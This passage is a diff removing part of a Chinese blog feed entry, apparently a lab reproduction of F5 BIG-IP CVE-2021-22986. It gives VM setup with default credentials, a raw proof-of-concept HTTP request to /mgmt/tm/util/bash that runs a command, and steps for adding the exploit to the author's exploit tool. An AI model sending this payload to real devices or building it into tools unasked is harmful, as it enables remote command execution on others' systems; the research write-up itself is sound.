-<p><a href="https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&pro=big-ip_v16.x&ver=16.0.1&container=16.0.1_Virtual-Edition&path=&file=&B1=I+Accept">https://downloads.f5.com/esd/eula.sv?sw=BIG-IP&amp;pro=big-ip_v16.x&amp;ver=16.0.1&amp;container=16.0.1_Virtual-Edition&amp;path=&amp;file=&amp;B1=I+Accept</a>  选择ova格式的，可以快速使用vm虚拟机打开，安装完后，用户名：root，密码：default，成功登陆后，输入config输入config ，几次回车即可看到当前ip，访问</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144019.png" alt="image-20210404113304697"></p>
-<h4 id="3-1-使用POC攻击"><a href="#3-1-使用POC攻击" class="headerlink" title="3.1 使用POC攻击"></a>3.1 使用POC攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /mgmt/tm/util/bash HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Basic YWRtaW46QVNhc1M=</span><br><span class="line">X-F5-Auth-Token: </span><br><span class="line">Host: 192.168.1.191</span><br><span class="line">Content-Length: 39</span><br><span class="line"></span><br><span class="line">&#123;&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c id&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144015.png" alt="image-20210404111524871"></p>
-<h2 id="0x04-利用工具编写"><a href="#0x04-利用工具编写" class="headerlink" title="0x04 利用工具编写"></a>0x04 利用工具编写</h2><p>直接使用上次的<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483987&idx=1&sn=2ee31ccbf8588c23e4184fcd3ab251f8&chksm=c2829b4af5f5125c563e437263eec4ebac08f32f2ace3e4bed9f5c8e562bac5299260b847c27#rd">图形化漏洞利用工具</a>编写</p>
-<blockquote>
-<p>图形化漏洞利用工具已更新</p>
-<p>项目地址：<a href="https://github.com/yhy0/ExpDemo-JavaFX">https://github.com/yhy0/ExpDemo-JavaFX</a></p>
-<p>V1.1 </p>
-<p>​	参考冰蝎的代理，添加代理设置，方便走burp调试</p>
-<p>​	优化批量检查逻辑，使用接口，这样每次添加新的漏洞利用时，就不需要修改批量检查的逻辑。</p>
-</blockquote>
-<p>在<code>src/main/java/com/yhy/core</code>下新建<code>CVE_2021_22986</code>类，实现<code>ExploitInterface</code>接口，并实现里面的函数，具体填充，直接将项目中的示例<code>CVE_2020_14882</code> 的内容复制过去，修改一下内容，填充payload即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144011.png" alt="image-20210404113814410"></p>
-<p>写完后，进入<code>src/main/java/com/yhy/core/Constants.java</code> 和 <code>src/main/java/com/yhy/tools/Tools.java</code>修改</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144002.png" alt="image-20210404132413838"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404144006.png" alt="image-20210404132702066"></p>
-<p>运行即可。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210404143957.gif" alt="CVE-2021-22986"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
